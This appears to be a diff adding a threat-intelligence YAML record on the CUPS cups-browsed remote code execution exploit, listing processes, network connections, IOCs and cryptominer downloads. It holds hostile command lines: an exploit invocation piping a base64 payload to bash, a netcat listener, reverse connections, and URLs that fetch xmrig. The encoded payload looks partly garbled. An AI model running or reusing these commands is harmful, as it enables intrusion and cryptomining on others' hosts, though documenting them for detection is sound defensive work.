@@ -1,0 +1,53 @@
+description: A series of critical severity bugs in the CUPS printers discovery mechanism
+  (cups-browsed) affecting Linux hosts were recently disclosed. The vulnerabilities
+  can be leveraged to automatically install a malicious printer and perform unauthenticated
+  remote code execution attacks.
+attribution: Unknown
+malware_families:
+- CoinMiner
+TTPs:
+  processes:
+  - cupsd
+  - foomatic-rip
+  - bash
+  - nc
+  - xmrig
+  - systemd
+  commandline:
+  - python3 haxcups.py --ip 10.0.3.11 --port 4444 --nam command "echo cm@gL3RtcCOM021rZnlnbyAvdGlwL2Y7Y2FOIC9@bXAVZNXZaCAtaSAJIDEWL jAuMy4x MSAINTULID4VAGIWL2Y= |base64 -d |bash"
+  - nc -lvp 5555
+  - /usr/sbin/cups-browsed
+  - foomatic-rip
+  - dash
+  - xmrig
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: nc
+    destination_address: 10.0.3.11
+    port: 4444
+  - executable: nc
+    destination_address: 10.0.3.9
+    port: 59054
+  file_activity:
+  - /tmp/nc
+  - http://10.6.3.11:6666/xmrig
+  - http://10.0.3.11:6666/config.js
+  persistence:
+  - Cron job creation
+  pipes: ''
+  process_relations:
+  - cupsd -> foomatic-rip -> bash -> nc
+IOCs:
+- ip: 10.0.3.11
+- port: 4444
+- port: 5555
+- url: http://10.6.3.11:6666/xmrig
+- url: http://10.0.3.11:6666/config.js
+authors:
+- Uptycs Team
+reference: https://www.uptycs.com/blog/threat-research-report-team/cups-exploit-protection-with-uptycs
+date_of_publication: September 30, 2024
+file_creation_date: June 12, 2025
